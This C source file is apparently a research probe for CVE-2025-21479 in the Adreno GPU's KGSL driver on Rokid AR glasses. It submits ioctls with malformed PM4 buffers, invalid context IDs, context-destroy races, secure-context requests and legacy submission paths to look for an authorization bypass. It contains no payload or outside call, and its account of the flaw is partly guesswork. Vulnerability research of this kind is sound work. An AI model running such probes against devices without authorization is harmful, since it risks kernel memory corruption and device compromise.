/*
 * CVE-2025-21479 GPU Micronode Authorization Bypass Probe
 * ========================================================
 *
 * Target: Rokid AR Glasses (Adreno 621, Kernel 5.10.209)
 *
 * Vulnerability Description:
 * "Memory corruption due to unauthorized command execution in GPU micronode
 *  while executing specific sequence of commands."
 *
 * CWE-863: Incorrect Authorization
 * CVSS: 8.6 HIGH (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
 *
 * Attack Vector Analysis:
 * - The "micronode" likely refers to GPU command buffer nodes in the
 *   KGSL draw object submission path
 * - "Specific sequence of commands" suggests certain IOCTL ordering
 *   bypasses authorization checks
 * - The vulnerability is in Graphics (Adreno GPU driver)
 *
 * Relevant IOCTLs:
 * - IOCTL_KGSL_GPU_COMMAND (0x4A): Submit GPU command buffer
 * - IOCTL_KGSL_GPU_AUX_COMMAND: Auxiliary command submission
 * - IOCTL_KGSL_SUBMIT_COMMANDS: Legacy command submission
 * - IOCTL_KGSL_DRAWCTXT_CREATE/DESTROY: Context management
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -o cve_2025_21479_probe cve_2025_21479_probe.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>

// ═══════════════════════════════════════════════════════════════════════════
// KGSL IOCTL Definitions (from kernel source)
// ═══════════════════════════════════════════════════════════════════════════

#define KGSL_IOC_TYPE 0x09
#define KGSL_CONTEXT_SAVE_GMEM 0x00000001
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_SUBMIT_IB_LIST 0x00000004
#define KGSL_CONTEXT_CTX_SWITCH 0x00000008
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_TRASH_STATE 0x00000020
#define KGSL_CONTEXT_PER_CONTEXT_TS 0x00000040
#define KGSL_CONTEXT_USER_GENERATED_TS 0x00000080
#define KGSL_CONTEXT_END_OF_FRAME 0x00000100
#define KGSL_CONTEXT_NO_FAULT_TOLERANCE 0x00000200
#define KGSL_CONTEXT_SYNC 0x00000400
#define KGSL_CONTEXT_PWR_CONSTRAINT 0x00000800
#define KGSL_CONTEXT_PRIORITY_MASK 0x0000F000
#define KGSL_CONTEXT_PRIORITY_SHIFT 12
#define KGSL_CONTEXT_PRIORITY_UNDEF 0
#define KGSL_CONTEXT_IFH_NOP 0x00010000
#define KGSL_CONTEXT_SECURE 0x00020000
#define KGSL_CONTEXT_NO_SNAPSHOT 0x00040000
#define KGSL_CONTEXT_SPARSE 0x00080000
#define KGSL_CONTEXT_PREEMPT_STYLE_MASK 0x0E000000
#define KGSL_CONTEXT_PREEMPT_STYLE_SHIFT 25
#define KGSL_CONTEXT_PREEMPT_STYLE_ANY 1
#define KGSL_CONTEXT_PREEMPT_STYLE_RINGBUFFER 2
#define KGSL_CONTEXT_PREEMPT_STYLE_FINEGRAIN 3

/* Command buffer flags */
#define KGSL_CMDBATCH_MEMLIST 0x00000001
#define KGSL_CMDBATCH_MARKER 0x00000002
#define KGSL_CMDBATCH_CTX_SWITCH 0x00000008
#define KGSL_CMDBATCH_PROFILING 0x00000010
#define KGSL_CMDBATCH_PROFILING_KTIME 0x00000020
#define KGSL_CMDBATCH_END_OF_FRAME 0x00000100
#define KGSL_CMDBATCH_SYNC 0x00000400
#define KGSL_CMDBATCH_PWR_CONSTRAINT 0x00000800
#define KGSL_CMDBATCH_SPARSE 0x00001000
#define KGSL_CMDBATCH_SUBMIT_IB_LIST 0x00002000

/* Memory allocation flags */
#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000
#define KGSL_MEMFLAGS_GPUWRITEONLY 0x02000000
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000
#define KGSL_MEMALIGN_MASK 0x00FF0000
#define KGSL_MEMALIGN_SHIFT 16
#define KGSL_MEMTYPE_MASK 0x0000FF00
#define KGSL_MEMTYPE_SHIFT 8
#define KGSL_CACHEMODE_MASK 0x0C000000
#define KGSL_CACHEMODE_SHIFT 26

/* Memory types */
#define KGSL_MEMTYPE_OBJECTANY 0
#define KGSL_MEMTYPE_FRAMEBUFFER 1
#define KGSL_MEMTYPE_RENDERBUFFER 2
#define KGSL_MEMTYPE_ARRAYBUFFER 3
#define KGSL_MEMTYPE_ELEMENTARRAYBUFFER 4
#define KGSL_MEMTYPE_VERTEXARRAYBUFFER 5
#define KGSL_MEMTYPE_TEXTURE 6
#define KGSL_MEMTYPE_SURFACE 7
#define KGSL_MEMTYPE_EGL_SURFACE 8
#define KGSL_MEMTYPE_GL 9
#define KGSL_MEMTYPE_CL 10
#define KGSL_MEMTYPE_CL_BUFFER_MAP 11
#define KGSL_MEMTYPE_CL_BUFFER_NOMAP 12
#define KGSL_MEMTYPE_CL_IMAGE_MAP 13
#define KGSL_MEMTYPE_CL_IMAGE_NOMAP 14
#define KGSL_MEMTYPE_CL_KERNEL_STACK 15
#define KGSL_MEMTYPE_COMMAND 16
#define KGSL_MEMTYPE_2D 17
#define KGSL_MEMTYPE_EGL_IMAGE 18
#define KGSL_MEMTYPE_EGL_SHADOW 19
#define KGSL_MEMTYPE_MULTISAMPLE 20
#define KGSL_MEMTYPE_KERNEL 255

/* ──────────────────────────────────────────────────────────────────────── */
/* IOCTL Structures                                                         */
/* ──────────────────────────────────────────────────────────────────────── */

struct kgsl_devinfo
{
    unsigned int device_id;
    unsigned int chip_id;
    unsigned int mmu_enabled;
    unsigned long gmem_gpubaseaddr;
    unsigned int gpu_id;
    size_t gmem_sizebytes;
};

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

struct kgsl_drawctxt_create
{
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    unsigned int drawctxt_id;
};

/* Memory object allocation */
struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    uint64_t id;
    uint64_t mmapoffset;
    uint64_t va_addr;
    uint64_t metadata_len;
    uint64_t metadata;
};

/* Command buffer descriptor */
struct kgsl_ibdesc
{
    uint64_t gpuaddr;
    uint64_t sizedwords;
    unsigned int ctrl;
};

/* Command submission (legacy) */
struct kgsl_ringbuffer_issueibcmds
{
    unsigned int drawctxt_id;
    unsigned int flags;
    unsigned int ibdesc_addr;
    unsigned int numibs;
    unsigned int timestamp;
};

/* GPU Command Structure */
struct kgsl_gpu_command
{
    uint64_t flags;
    uint64_t cmdlist;
    uint64_t cmdsize;
    uint64_t objlist;
    uint64_t objsize;
    uint64_t synclist;
    uint64_t syncsize;
    unsigned int context_id;
    unsigned int numcmds;
    unsigned int numobjs;
    unsigned int numsyncs;
    unsigned int timestamp;
    unsigned int cmdlist_size;
    unsigned int objlist_size;
    unsigned int synclist_size;
};

/* GPU Aux Command (interesting for micronode access) */
struct kgsl_gpu_aux_command
{
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdlist_size;
    unsigned int cmd_type;
    unsigned int context_id;
    unsigned int timestamp;
};

/* Command list entry */
struct kgsl_command_object
{
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    unsigned int id;
};

/* Submit commands (alternative path) */
struct kgsl_submit_commands
{
    unsigned int context_id;
    unsigned int flags;
    uint64_t cmdlist;
    unsigned int numcmds;
    uint64_t synclist;
    unsigned int numsyncs;
    unsigned int timestamp;
};

/* ──────────────────────────────────────────────────────────────────────── */
/* IOCTL Definitions                                                        */
/* ──────────────────────────────────────────────────────────────────────── */

#define KGSL_PROP_DEVICE_INFO 0x1
#define KGSL_PROP_DEVICE_SHADOW 0x2
#define KGSL_PROP_DEVICE_POWER 0x3
#define KGSL_PROP_SHMEM 0x4
#define KGSL_PROP_SHMEM_APERTURES 0x5
#define KGSL_PROP_MMU_ENABLE 0x6
#define KGSL_PROP_INTERRUPT_WAITS 0x7
#define KGSL_PROP_VERSION 0x8
#define KGSL_PROP_GPU_RESET_STAT 0x9
#define KGSL_PROP_PWRCTRL 0xA
#define KGSL_PROP_PWR_CONSTRAINT 0xB
#define KGSL_PROP_UCHE_GMEM_VADDR 0xC
#define KGSL_PROP_SP_GENERIC_MEM 0xD
#define KGSL_PROP_UCODE_VERSION 0xE
#define KGSL_PROP_GPMU_VERSION 0xF
#define KGSL_PROP_DEVICE_BITNESS 0x18
#define KGSL_PROP_DEVICE_QDSS_STM 0x14

/* IOCTL commands */
#define IOCTL_KGSL_DEVICE_GETPROPERTY \
    _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)

#define IOCTL_KGSL_DRAWCTXT_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

#define IOCTL_KGSL_DRAWCTXT_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

#define IOCTL_KGSL_GPUOBJ_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

#define IOCTL_KGSL_GPU_COMMAND \
    _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

#define IOCTL_KGSL_GPU_AUX_COMMAND \
    _IOWR(KGSL_IOC_TYPE, 0x4B, struct kgsl_gpu_aux_command)

#define IOCTL_KGSL_SUBMIT_COMMANDS \
    _IOWR(KGSL_IOC_TYPE, 0x3D, struct kgsl_submit_commands)

#define IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS \
    _IOWR(KGSL_IOC_TYPE, 0x10, struct kgsl_ringbuffer_issueibcmds)

/* ═══════════════════════════════════════════════════════════════════════════
 * Global State
 * ═══════════════════════════════════════════════════════════════════════════ */

static int kgsl_fd = -1;
static unsigned int ctx_id = 0;
static uint64_t gpumem_id = 0;
static uint64_t gpumem_addr = 0;
static void *cmd_buffer = NULL;
static size_t cmd_buffer_size = 4096;

/* ═══════════════════════════════════════════════════════════════════════════
 * Device Information
 * ═══════════════════════════════════════════════════════════════════════════ */

void print_device_info(void)
{
    struct kgsl_devinfo devinfo = {0};
    struct kgsl_device_getproperty prop = {
        .type = KGSL_PROP_DEVICE_INFO,
        .value = &devinfo,
        .sizebytes = sizeof(devinfo),
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[*] Device Info:\n");
        printf("    Device ID:    0x%08x\n", devinfo.device_id);
        printf("    Chip ID:      0x%08x\n", devinfo.chip_id);
        printf("    GPU ID:       0x%08x\n", devinfo.gpu_id);
        printf("    MMU Enabled:  %u\n", devinfo.mmu_enabled);
        printf("    GMEM Base:    0x%lx\n", devinfo.gmem_gpubaseaddr);
        printf("    GMEM Size:    0x%zx (%zu KB)\n", devinfo.gmem_sizebytes,
               devinfo.gmem_sizebytes / 1024);
    }
    else
    {
        printf("[-] Failed to get device info: %s\n", strerror(errno));
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Context Management
 * ═══════════════════════════════════════════════════════════════════════════ */

int create_context(unsigned int flags)
{
    struct kgsl_drawctxt_create create = {
        .flags = flags,
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create) < 0)
    {
        printf("[-] Failed to create context: %s\n", strerror(errno));
        return -1;
    }

    printf("[+] Created context: ID=%u\n", create.drawctxt_id);
    return create.drawctxt_id;
}

void destroy_context(unsigned int id)
{
    struct kgsl_drawctxt_destroy destroy = {.drawctxt_id = id};
    ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Memory Allocation
 * ═══════════════════════════════════════════════════════════════════════════ */

int allocate_gpu_memory(size_t size, uint64_t *id, uint64_t *va_addr)
{
    struct kgsl_gpuobj_alloc alloc = {
        .size = size,
        .flags = (KGSL_MEMTYPE_COMMAND << KGSL_MEMTYPE_SHIFT) |
                 (12 << KGSL_MEMALIGN_SHIFT), // 4KB aligned
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0)
    {
        printf("[-] Failed to allocate GPU memory: %s\n", strerror(errno));
        return -1;
    }

    *id = alloc.id;
    *va_addr = alloc.va_addr;

    printf("[+] Allocated GPU memory: ID=%lu, VA=0x%lx, size=%lu\n",
           alloc.id, alloc.va_addr, alloc.size);

    /* mmap the buffer */
    cmd_buffer = mmap(NULL, size, PROT_READ | PROT_WRITE,
                      MAP_SHARED, kgsl_fd, alloc.mmapoffset);
    if (cmd_buffer == MAP_FAILED)
    {
        printf("[-] Failed to mmap GPU memory: %s\n", strerror(errno));
        cmd_buffer = NULL;
        return -1;
    }

    printf("[+] mmap'd GPU memory at %p\n", cmd_buffer);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Command Submission Tests
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Test 1: Normal GPU Command Submission
 * This is the baseline to understand normal behavior
 */
void test_normal_gpu_command(void)
{
    printf("\n[TEST 1] Normal GPU Command Submission\n");
    printf("─────────────────────────────────────────\n");

    struct kgsl_command_object cmdobj = {
        .gpuaddr = gpumem_addr,
        .size = 16, // NOP commands
        .flags = 0,
        .id = gpumem_id,
    };

    struct kgsl_gpu_command cmd = {
        .flags = 0,
        .cmdlist = (uint64_t)&cmdobj,
        .cmdsize = sizeof(cmdobj),
        .context_id = ctx_id,
        .numcmds = 1,
    };

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
    if (ret < 0)
    {
        printf("    Result: FAILED (errno=%d: %s)\n", errno, strerror(errno));
    }
    else
    {
        printf("    Result: SUCCESS (timestamp=%u)\n", cmd.timestamp);
    }
}

/*
 * Test 2: GPU AUX Command (Potential Micronode Path)
 * AUX commands may have different authorization checks
 */
void test_aux_command(void)
{
    printf("\n[TEST 2] GPU AUX Command Submission\n");
    printf("─────────────────────────────────────────\n");

    struct kgsl_gpu_aux_command aux = {
        .flags = 0,
        .cmdlist = gpumem_addr,
        .cmdlist_size = 64,
        .cmd_type = 0, // Try different types
        .context_id = ctx_id,
    };

    /* Try various cmd_types to find interesting behavior */
    for (int type = 0; type < 8; type++)
    {
        aux.cmd_type = type;
        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_AUX_COMMAND, &aux);
        printf("    cmd_type=%d: %s (errno=%d)\n",
               type, ret < 0 ? "FAILED" : "OK", ret < 0 ? errno : 0);
    }
}

/*
 * Test 3: Context Switching During Submission
 * Creating/destroying contexts around command submission
 * may confuse authorization state
 */
void test_context_switch_race(void)
{
    printf("\n[TEST 3] Context Switch Race\n");
    printf("─────────────────────────────────────────\n");

    for (int i = 0; i < 5; i++)
    {
        /* Create a new context */
        int new_ctx = create_context(KGSL_CONTEXT_SUBMIT_IB_LIST |
                                     KGSL_CONTEXT_PER_CONTEXT_TS);
        if (new_ctx < 0)
            continue;

        /* Submit command to original context */
        struct kgsl_command_object cmdobj = {
            .gpuaddr = gpumem_addr,
            .size = 16,
            .id = gpumem_id,
        };

        struct kgsl_gpu_command cmd = {
            .cmdlist = (uint64_t)&cmdobj,
            .cmdsize = sizeof(cmdobj),
            .context_id = ctx_id, // Original context
            .numcmds = 1,
        };

        /* Submit while destroying the new context */
        destroy_context(new_ctx);

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
        printf("    Iteration %d: %s\n", i, ret < 0 ? "FAILED" : "OK");
    }
}

/*
 * Test 4: Invalid Context ID
 * Try submitting commands with manipulated context IDs
 */
void test_invalid_context(void)
{
    printf("\n[TEST 4] Invalid Context ID Tests\n");
    printf("─────────────────────────────────────────\n");

    struct kgsl_command_object cmdobj = {
        .gpuaddr = gpumem_addr,
        .size = 16,
        .id = gpumem_id,
    };

    struct kgsl_gpu_command cmd = {
        .cmdlist = (uint64_t)&cmdobj,
        .cmdsize = sizeof(cmdobj),
        .numcmds = 1,
    };

    /* Test various context IDs */
    unsigned int test_ids[] = {0, 1, ctx_id, ctx_id + 1, 0xFFFFFFFF, 0xDEADBEEF};

    for (int i = 0; i < 6; i++)
    {
        cmd.context_id = test_ids[i];
        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
        printf("    context_id=0x%08x: %s (errno=%d)\n",
               test_ids[i], ret < 0 ? "FAILED" : "OK", ret < 0 ? errno : 0);
    }
}

/*
 * Test 5: Secure Context Flag
 * Try to access secure GPU execution path
 */
void test_secure_context(void)
{
    printf("\n[TEST 5] Secure Context Tests\n");
    printf("─────────────────────────────────────────\n");

    /* Try to create a secure context */
    int secure_ctx = create_context(KGSL_CONTEXT_SECURE |
                                    KGSL_CONTEXT_SUBMIT_IB_LIST);

    if (secure_ctx >= 0)
    {
        printf("[!] INTERESTING: Secure context created!\n");

        struct kgsl_command_object cmdobj = {
            .gpuaddr = gpumem_addr,
            .size = 16,
            .id = gpumem_id,
        };

        struct kgsl_gpu_command cmd = {
            .cmdlist = (uint64_t)&cmdobj,
            .cmdsize = sizeof(cmdobj),
            .context_id = secure_ctx,
            .numcmds = 1,
        };

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
        printf("    Secure command: %s (errno=%d)\n",
               ret < 0 ? "FAILED" : "OK", ret < 0 ? errno : 0);

        destroy_context(secure_ctx);
    }
}

/*
 * Test 6: Command Buffer Corruption
 * Submit commands with malformed command buffer contents
 */
void test_malformed_commands(void)
{
    printf("\n[TEST 6] Malformed Command Buffer Tests\n");
    printf("─────────────────────────────────────────\n");

    if (cmd_buffer == NULL)
    {
        printf("    No command buffer available\n");
        return;
    }

    /* Fill command buffer with various patterns */
    uint32_t *cmds = (uint32_t *)cmd_buffer;

    struct test_case
    {
        const char *name;
        uint32_t pattern;
    } cases[] = {
        {"NOP pattern", 0x00000000},
        {"All ones", 0xFFFFFFFF},
        {"PM4 Type 0", 0x00000000}, // Type 0 packet
        {"PM4 Type 2", 0x80000000}, // Type 2 packet (NOP)
        {"PM4 Type 3", 0xC0000000}, // Type 3 packet (cmd)
        {"PM4 Type 7", 0x70000000}, // Type 7 packet
    };

    for (int i = 0; i < 6; i++)
    {
        /* Fill buffer with pattern */
        for (int j = 0; j < 256; j++)
        {
            cmds[j] = cases[i].pattern;
        }

        struct kgsl_command_object cmdobj = {
            .gpuaddr = gpumem_addr,
            .size = 64,
            .id = gpumem_id,
        };

        struct kgsl_gpu_command cmd = {
            .cmdlist = (uint64_t)&cmdobj,
            .cmdsize = sizeof(cmdobj),
            .context_id = ctx_id,
            .numcmds = 1,
        };

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
        printf("    %s: %s (errno=%d)\n",
               cases[i].name, ret < 0 ? "FAILED" : "OK", ret < 0 ? errno : 0);
    }
}

/*
 * Test 7: Multi-command Submission
 * Submit multiple commands in sequence rapidly
 */
void test_rapid_submission(void)
{
    printf("\n[TEST 7] Rapid Multi-command Submission\n");
    printf("─────────────────────────────────────────\n");

    struct kgsl_command_object cmdobj = {
        .gpuaddr = gpumem_addr,
        .size = 16,
        .id = gpumem_id,
    };

    struct kgsl_gpu_command cmd = {
        .cmdlist = (uint64_t)&cmdobj,
        .cmdsize = sizeof(cmdobj),
        .context_id = ctx_id,
        .numcmds = 1,
    };

    int success = 0, failed = 0;

    for (int i = 0; i < 1000; i++)
    {
        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
        if (ret < 0)
            failed++;
        else
            success++;
    }

    printf("    Submitted 1000 commands: %d success, %d failed\n",
           success, failed);
}

/*
 * Test 8: Legacy ISSUEIBCMDS Path
 * The old submission path might have different checks
 */
void test_legacy_issueib(void)
{
    printf("\n[TEST 8] Legacy ISSUEIBCMDS Path\n");
    printf("─────────────────────────────────────────\n");

    struct kgsl_ibdesc ibdesc = {
        .gpuaddr = gpumem_addr,
        .sizedwords = 4,
        .ctrl = 0,
    };

    struct kgsl_ringbuffer_issueibcmds issue = {
        .drawctxt_id = ctx_id,
        .flags = KGSL_CMDBATCH_SUBMIT_IB_LIST,
        .ibdesc_addr = (unsigned int)(uintptr_t)&ibdesc,
        .numibs = 1,
    };

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS, &issue);
    printf("    Result: %s (errno=%d, timestamp=%u)\n",
           ret < 0 ? "FAILED" : "OK", ret < 0 ? errno : 0, issue.timestamp);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Main Entry Point
 * ═══════════════════════════════════════════════════════════════════════════ */

int main(int argc, char *argv[])
{
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2025-21479 GPU Micronode Authorization Bypass Probe      ║\n");
    printf("║  ───────────────────────────────────────────────────────────  ║\n");
    printf("║  Target: Rokid AR Glasses (Adreno 621, Kernel 5.10.209)       ║\n");
    printf("║  Vuln:   Memory corruption in GPU micronode commands          ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] UID=%d, EUID=%d\n", getuid(), geteuid());

    /* Open KGSL device */
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Failed to open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0 (fd=%d)\n", kgsl_fd);

    /* Get device information */
    print_device_info();

    /* Create draw context */
    ctx_id = create_context(KGSL_CONTEXT_SUBMIT_IB_LIST |
                            KGSL_CONTEXT_PER_CONTEXT_TS);
    if ((int)ctx_id < 0)
    {
        printf("[-] Failed to create context\n");
        close(kgsl_fd);
        return 1;
    }

    /* Allocate GPU memory for command buffers */
    if (allocate_gpu_memory(cmd_buffer_size, &gpumem_id, &gpumem_addr) < 0)
    {
        printf("[-] Failed to allocate GPU memory\n");
        destroy_context(ctx_id);
        close(kgsl_fd);
        return 1;
    }

    /* Fill command buffer with NOPs */
    if (cmd_buffer)
    {
        memset(cmd_buffer, 0, cmd_buffer_size);
        /* PM4 Type 2 (NOP) packets */
        uint32_t *cmds = (uint32_t *)cmd_buffer;
        for (int i = 0; i < 256; i++)
        {
            cmds[i] = 0x80000000; // Type 2 NOP
        }
    }

    printf("\n");
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("                    VULNERABILITY PROBES\n");
    printf("═══════════════════════════════════════════════════════════════\n");

    /* Run all tests */
    test_normal_gpu_command();
    test_aux_command();
    test_context_switch_race();
    test_invalid_context();
    test_secure_context();
    test_malformed_commands();
    test_rapid_submission();
    test_legacy_issueib();

    printf("\n");
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("                         SUMMARY\n");
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("\n");
    printf("[*] Probe complete. Check dmesg for any kernel warnings:\n");
    printf("    dmesg | grep -iE 'kgsl|adreno|gpu|fault'\n\n");

    /* Cleanup */
    if (cmd_buffer && cmd_buffer != MAP_FAILED)
    {
        munmap(cmd_buffer, cmd_buffer_size);
    }
    destroy_context(ctx_id);
    close(kgsl_fd);

    return 0;
}
